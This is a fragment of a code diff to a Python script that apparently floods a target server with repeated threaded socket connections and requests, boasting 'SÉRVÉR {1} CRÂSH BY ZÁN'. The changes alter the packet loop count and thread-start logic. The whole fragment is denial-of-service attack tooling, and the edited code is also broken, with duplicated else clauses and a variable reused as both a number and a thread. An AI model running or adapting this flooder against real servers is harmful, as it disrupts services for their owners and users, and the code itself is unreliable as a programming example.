@@ -915,11 +915,11 @@ def join2():
            s.connect((str(ip),int(port)))
            s.send((data5,data3,data2))
            s.send((main_req))
-           for i in range(th):
+           for i in range(pack):
                s.connect((str(ip),int(port)))
                s.send((data5,data3,data2))
                s.send((main_req))
-           xx += random.randint(0, int(th))
+           xx += random.randint(0, int(pack))
            print("SÉRVÉR {1} CRÂSH BY ZÁN")
         except:
             s.close()
@@ -929,7 +929,8 @@ for x in range(th):
   th = threading.Thread(target=start)
   th.start()
 else:
-  th = threading.Thread(target=join2)
   th = threading.Thread(target=attck)
-  th.join()
+  th.start()
+else:
+  th = threading.Thread(target=join2)
   th.start()
